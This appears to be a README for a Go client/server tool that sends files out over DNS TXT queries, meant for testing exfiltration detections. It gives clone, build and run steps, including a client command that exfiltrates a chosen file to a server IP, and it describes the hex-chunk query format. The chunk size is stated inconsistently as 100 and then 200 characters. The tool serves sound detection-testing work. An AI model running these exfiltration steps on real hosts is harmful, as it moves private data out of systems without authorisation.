# dns-TXT-exfi-test
Simple client/server in golang to help with testing data exfil detections over DNS TXT records. Note: this utility is intended for detections testing rather than for use in red team operations, as this does not contain opsec controls (uses simple hex encoding).

## Steps:
On Server Host:

1. > git clone https://github.com/cedowens/dns-TXT-exfil-test

2. > cd dns-TXT-exfil-test/server

3. > go get github.com/miekg/dns

4. > go build

5. > ./server


On Client Host:

1. > git clone https://github.com/cedowens/dns-TXT-exfil-test

2. > cd dns-TXT-exfil-test/client

3. > sed -i -e 's|10.10.10.10|IP_OF_YOUR_SERVER_HOST|g' client.go

4. > go build

5. > ./client [path_to_file_to_exfil]

------------

## Under The Hood

From a detections perspective, this is how this tool works:

1. The client takes the file, breaks it into 100 character hex encoded chunks

2. The client then takes each 100 character chunk and sends it in a DNS TXT record request as follows:

`[hex_file_data].macconsultants.com,  TYPE: TXT, CLASS IN`

3. The server takes each 200 character hex encoded chunk, unhexlifies it, and writes it to a file in the current directory named "outfile"

4. The server also sends a TXT answer to that query as follows:

`[hex_file_data].macconsultants.com, TYPE TXT, CLASS IN`


This can be a helpful way to validate any detections around suspicious DNS TXT traffic
